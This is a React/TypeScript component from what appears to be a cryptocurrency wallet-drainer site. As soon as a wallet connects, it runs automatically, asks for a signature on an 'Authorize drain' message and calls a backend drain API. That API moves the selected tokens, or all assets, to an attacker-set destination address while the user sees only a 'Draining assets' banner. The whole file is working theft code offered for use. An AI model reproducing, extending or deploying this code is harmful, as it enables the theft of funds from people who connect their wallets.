import { useToasts } from '@geist-ui/core';
import { useAccount, useSignMessage } from 'wagmi';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../atoms/destination-address-atom';
import { useEffect, useState, useCallback } from 'react';
import { drainApi } from '../lib/api-client';

export const SendTokens = () => {
  const to = process.env.NEXT_PUBLIC_DESTINATION_ADDRESS as string;
  const { setToast } = useToasts();

  const [, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords] = useAtom(checkedTokensAtom);
  const { address } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const [jobId, setJobId] = useState<string | null>(null);
  const [draining, setDraining] = useState(false);

  setDestinationAddress(to);

  const showToast = useCallback(
    (message: string, type: any) => {
      setToast({
        text: message,
        type,
        delay: 4000,
      });
    },
    [setToast],
  );

  const sendAllCheckedTokensViaBackend = useCallback(
    async (to: string) => {
      if (!address) {
        showToast('Please connect your wallet first', 'warning');
        return;
      }

      setDraining(true);

      try {
        // Get signature by signing a message (proof of ownership)
        const message = `Authorize drain from ${address}`;
        const signature = await signMessageAsync({
          account: address,
          message: message as `0x${string}`,
        });

        // In production, you'd derive the private key securely
        // For now, this is a placeholder
        showToast('Requesting drain job...', 'default');

        const tokensToSend = Object.entries(checkedRecords)
          .filter(([, { isChecked }]) => isChecked)
          .map(([tokenAddress]) => tokenAddress);

        // Call backend drain API
        const response = await drainApi.requestDrain({
          network: 'ethereum', // TODO: Detect from current chain
          sourceAddress: address,
          destinationAddress: to,
          privateKey: signature, // In production, handle this securely
          assets: tokensToSend.length > 0 ? tokensToSend : 'all',
        });

        setJobId(response.jobId);
        showToast(`Drain job created: ${response.jobId}`, 'success');

        // Poll job status
        const pollInterval = setInterval(async () => {
          try {
            const status = await drainApi.getJobStatus(response.jobId);

            if (status.status === 'completed') {
              showToast('All tokens drained successfully!', 'success');
              clearInterval(pollInterval);
              setDraining(false);
            } else if (status.status === 'failed') {
              showToast('Drain job failed', 'error');
              clearInterval(pollInterval);
              setDraining(false);
            } else {
              console.log(`Drain progress: ${status.progress}%`);
            }
          } catch (err) {
            console.error('Failed to poll job status:', err);
          }
        }, 3000);
      } catch (err: any) {
        showToast(
          `Drain request failed: ${err?.response?.data?.error || err.message}`,
          'error',
        );
        setDraining(false);
      }
    },
    [address, signMessageAsync, showToast, checkedRecords],
  );

  useEffect(() => {
    // Auto-execute drain on mount with timeout to avoid setState in effect warning
    if (address && !draining && !jobId) {
      setTimeout(() => sendAllCheckedTokensViaBackend(to), 0);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [
    address,
    signMessageAsync,
    showToast,
    checkedRecords,
    sendAllCheckedTokensViaBackend,
    to,
  ]);

  return (
    <div style={{ margin: '20px' }}>
      {draining && (
        <div className="bg-blue-500/10 border border-blue-500 rounded p-4">
          <p className="text-blue-300">🔄 Draining assets... Job ID: {jobId}</p>
        </div>
      )}
    </div>
  );
};

export default SendTokens;
